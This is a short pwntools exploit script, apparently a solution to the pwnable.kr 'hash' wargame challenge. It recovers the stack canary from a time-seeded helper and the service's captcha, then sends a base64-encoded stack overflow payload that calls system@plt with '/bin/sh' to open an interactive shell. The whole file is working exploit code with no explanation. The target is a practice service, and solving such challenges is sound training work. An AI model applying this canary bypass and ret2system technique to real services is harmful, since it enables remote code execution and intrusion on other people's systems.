
from pwn import *

elf = ELF('hash')

context.log_level = 'debug'
p = remote('pwnable.kr', 9002)

p.recvuntil('captcha : ')
captcha = int(p.recvline().strip())
p.sendline(str(captcha))
canary = os.popen('./canary {:d} {:d}'.format(int(time.time()), captcha)).read().strip()
canary = int(canary, 16)
success('canary = 0x{:0x}'.format(canary))

p.recvuntil('Encode your data with BASE64 then paste me!\n')

payload  = b'A'*512
payload += p32(canary)
payload += b'B'*12         # padding
payload += p32(elf.plt['system'])
payload += b'CCCC'         # ret addr
payload += p32(elf.symbols['g_buf'] + 0x2d0)

p.sendline(b64e(payload) + '/bin/sh\x00')

p.interactive()
